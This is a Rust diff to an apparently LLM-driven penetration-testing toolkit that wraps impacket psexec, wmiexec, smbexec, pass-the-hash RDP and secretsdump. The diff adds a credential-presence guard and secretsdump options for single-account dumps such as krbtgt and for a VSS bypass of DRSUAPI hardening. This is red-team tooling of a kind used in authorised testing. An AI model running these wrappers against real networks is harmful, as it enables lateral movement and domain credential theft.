@@ -9,6 +9,29 @@ use crate::credentials;
 use crate::executor::CommandBuilder;
 use crate::ToolOutput;
 
+/// Reject calls that would land impacket in an interactive `getpass()` prompt.
+/// Without password or hash, impacket asks the controlling TTY for a password
+/// and crashes with EOFError when run from a non-interactive worker.
+fn require_password_or_hash(
+    tool: &str,
+    username: &str,
+    domain: Option<&str>,
+    password: Option<&str>,
+    hash: Option<&str>,
+) -> Result<()> {
+    if password.is_none() && hash.is_none() {
+        anyhow::bail!(
+            "{tool} requires a password or hash for {username}@{} but none was \
+             supplied. Credentials must be present in operation state for the \
+             (username, domain) pair so the resolver can inject them, or the \
+             LLM must call the *_kerberos variant with a valid ticket. Refusing \
+             to run because impacket would call getpass() and crash on no-TTY.",
+            domain.unwrap_or("(no domain)")
+        );
+    }
+    Ok(())
+}
+
 /// Execute a command on a remote host via impacket-psexec.
 ///
 /// Required args: `target`, `username`
@@ -21,6 +44,8 @@ pub async fn psexec(args: &Value) -> Result<ToolOutput> {
     let domain = optional_str(args, "domain");
     let command =
         optional_str(args, "command").unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);
+
+    require_password_or_hash("psexec", username, domain, password, hash)?;
 
     let (auth_str, extra_args) =
         credentials::impacket_auth(domain, username, password, hash, target);
@@ -76,6 +101,8 @@ pub async fn wmiexec(args: &Value) -> Result<ToolOutput> {
     let domain = optional_str(args, "domain");
     let command = optional_str(args, "command").unwrap_or("whoami");
 
+    require_password_or_hash("wmiexec", username, domain, password, hash)?;
+
     let (auth_str, extra_args) =
         credentials::impacket_auth(domain, username, password, hash, target);
 
@@ -128,6 +155,8 @@ pub async fn smbexec(args: &Value) -> Result<ToolOutput> {
     let hash = optional_str(args, "hash");
     let domain = optional_str(args, "domain");
     let command = optional_str(args, "command").unwrap_or("whoami");
+
+    require_password_or_hash("smbexec", username, domain, password, hash)?;
 
     let (auth_str, extra_args) =
         credentials::impacket_auth(domain, username, password, hash, target);
@@ -225,6 +254,7 @@ pub async fn xfreerdp(args: &Value) -> Result<ToolOutput> {
 
     cmd.arg("/cert-ignore")
         .arg("+auth-only")
+        .env("HOME", "/root")
         .timeout_secs(30)
         .execute()
         .await
@@ -260,7 +290,9 @@ pub async fn ssh_with_password(args: &Value) -> Result<ToolOutput> {
 /// Dump secrets from a remote host via impacket-secretsdump with Kerberos auth.
 ///
 /// Required args: `target`, `username`, `domain`, `ticket_path`
-/// Optional args: `dc_ip`, `target_ip`, `timeout_minutes`
+/// Optional args: `dc_ip`, `target_ip`, `timeout_minutes`,
+///                `just_dc_user` (single account, e.g. `krbtgt`),
+///                `use_vss` (bool — use VSS method to bypass DRSUAPI hardening)
 pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
     let target = required_str(args, "target")?;
     let username = required_str(args, "username")?;
@@ -268,22 +300,28 @@ pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
     let ticket_path = required_str(args, "ticket_path")?;
     let dc_ip = optional_str(args, "dc_ip");
     let target_ip = optional_str(args, "target_ip");
+    let just_dc_user = optional_str(args, "just_dc_user");
+    let use_vss = crate::args::optional_bool(args, "use_vss").unwrap_or(false);
     let timeout_minutes = optional_i64(args, "timeout_minutes").unwrap_or(3);
     let timeout_secs = (timeout_minutes * 60) as u64;
 
     let target_str = format!("{domain}/{username}@{target}");
     let (env_key, env_val) = credentials::kerberos_env(ticket_path);
 
-    CommandBuilder::new("impacket-secretsdump")
+    let mut cmd = CommandBuilder::new("impacket-secretsdump")
         .arg("-k")
         .arg("-no-pass")
         .arg(&target_str)
         .flag_opt("-dc-ip", dc_ip)
         .flag_opt("-target-ip", target_ip)
-        .env(env_key, env_val)
-        .timeout_secs(timeout_secs)
-        .execute()
-        .await
+        .flag_opt("-just-dc-user", just_dc_user)
+        .env(env_key, env_val);
+
+    if use_vss {
+        cmd = cmd.arg("-use-vss");
+    }
+
+    cmd.timeout_secs(timeout_secs).execute().await
 }
 
 #[cfg(test)]
@@ -291,6 +329,8 @@ mod tests {
     use crate::args::{optional_i64, optional_str, required_str};
     use crate::credentials;
     use serde_json::json;
+
+    // --- psexec ---
 
     #[test]
     fn psexec_requires_target() {
@@ -357,6 +397,8 @@ mod tests {
         assert_eq!(auth_str, "CONTOSO/admin@192.168.58.1");
         assert_eq!(extra_args, vec!["-hashes", ":aabbccdd"]);
     }
+
+    // --- psexec_kerberos ---
 
     #[test]
     fn psexec_kerberos_target_format() {
@@ -432,6 +474,8 @@ mod tests {
         assert_eq!(optional_str(&args, "dc_ip"), Some("192.168.58.1"));
     }
 
+    // --- wmiexec ---
+
     #[test]
     fn wmiexec_requires_target() {
         let args = json!({"username": "admin"});
@@ -450,6 +494,8 @@ mod tests {
         let command = optional_str(&args, "command").unwrap_or("whoami");
         assert_eq!(command, "whoami");
     }
+
+    // --- wmiexec_kerberos ---
 
     #[test]
     fn wmiexec_kerberos_target_format() {
@@ -472,6 +518,8 @@ mod tests {
         assert_eq!(command, "whoami");
     }
 
+    // --- smbexec ---
+
     #[test]
     fn smbexec_requires_target() {
         let args = json!({"username": "admin"});
@@ -491,6 +539,8 @@ mod tests {
         assert_eq!(command, "whoami");
     }
 
+    // --- smbexec_kerberos ---
+
     #[test]
     fn smbexec_kerberos_target_format() {
         let domain = "north.contoso.local";
@@ -502,6 +552,8 @@ mod tests {
             "north.contoso.local/admin@dc02.north.contoso.local"
         );
     }
+
+    // --- evil_winrm ---
 
     #[test]
     fn evil_winrm_default_command() {
@@ -571,6 +623,8 @@ mod tests {
         assert!(used_flag.is_empty());
     }
 
+    // --- xfreerdp ---
+
     #[test]
     fn xfreerdp_target_format() {
         let target = "192.168.58.1";
@@ -621,6 +675,8 @@ mod tests {
         assert_eq!(auth_arg, "/pth:aabbccdd");
     }
 
+    // --- ssh_with_password ---
+
     #[test]
     fn ssh_user_host_format() {
         let username = "root";
@@ -666,6 +722,8 @@ mod tests {
         });
         assert!(optional_str(&args, "port").is_none());
     }
+
+    // --- secretsdump_kerberos ---
 
     #[test]
     fn secretsdump_kerberos_target_format() {
@@ -724,6 +782,8 @@ mod tests {
         });
         assert!(required_str(&args, "ticket_path").is_err());
     }
+
+    // --- mock executor tests ---
 
     use crate::executor::mock;
 
